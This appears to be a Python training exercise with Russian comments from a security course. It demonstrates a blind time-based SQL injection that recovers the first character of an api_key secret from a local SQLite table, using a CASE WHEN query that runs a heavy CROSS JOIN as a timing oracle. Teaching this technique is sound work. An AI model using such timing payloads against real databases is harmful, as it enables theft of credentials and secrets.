# Вам необходимо выступить в роли злоумышленника и угадать первый символ секретного значения (value) для значения  api_key,
# анализируя время ответа базы данных (слепая time-based SQL-инъекция).
# Вы можете получить данные из всей таблицы secrets без ограничений.
# Напрямую запросить значение value нельзя, его нужно определить его по задержкам. 
# В базе данных 4.3.4.db есть таблица secrets (key, value), в которой хранятся ключи и значения.
# Например, там есть запись с ключом api_key и секретным значением (value).

#### Пояснение к задаче
# 1. Импортируйте  sqlite3 и time и подключитесь к базе данных 4.3.4.db
# 2. Создайте список символов для перебора (английские буквы и цифры)
# 3. Для каждого символа сформируйте запрос с конструкцией SELECT CASE WHEN ... THEN ... ELSE ... END
#     * В условии проверьте, равен ли первый символ значения из таблицы secrets текущему символу
#     * Если условие истинно, выполните длительную операцию, например, декартово произведение системной таблицы pragma_compile_options трижды
#     * Если ложно — верните 0.
# 4. Замерьте время выполнения запроса
# 5. Если время выполнения превышает порог (например, t > 0.01), значит символ угадан, его надо вывести 

import sqlite3
import time
import string

def crack_first_char():
    # 1. Подключение к базе данных
    conn = sqlite3.connect('4.3.4.db')
    cursor = conn.cursor()

    # Символы для перебора: буквы и цифры
    chars = string.ascii_letters + string.digits
  
    # 2. Перебор символов
    for char in chars:
        # Формируем сложный запрос.
        # Если первый символ value равен char, выполняем тяжелое декартово произведение
        # (трижды обращаемся к pragma_compile_options для создания задержки)
        query = f"""
        SELECT CASE
            WHEN (SELECT SUBSTR(value, 1, 1) FROM secrets WHERE key = 'api_key') = '{char}'
            THEN (SELECT count(*) FROM pragma_compile_options CROSS JOIN pragma_compile_options CROSS JOIN pragma_compile_options)
            ELSE 0
        END
        """
      
        start_time = time.time()
        cursor.execute(query)
        cursor.fetchone()
        end_time = time.time()
      
        duration = end_time - start_time
      
        # 3. Если задержка существенна (напр. > 0.05 сек), символ угадан
        # Порог зависит от мощности процессора, 0.05 обычно достаточно
        if duration > 0.05:
            conn.close()
            return char
          
    conn.close()
    return None

if __name__ == "__main__":
    result = crack_first_char()
    if result:
        print(f"Первый символ секрета угадан: {result}")
    else:
        print("Символ не найден.")
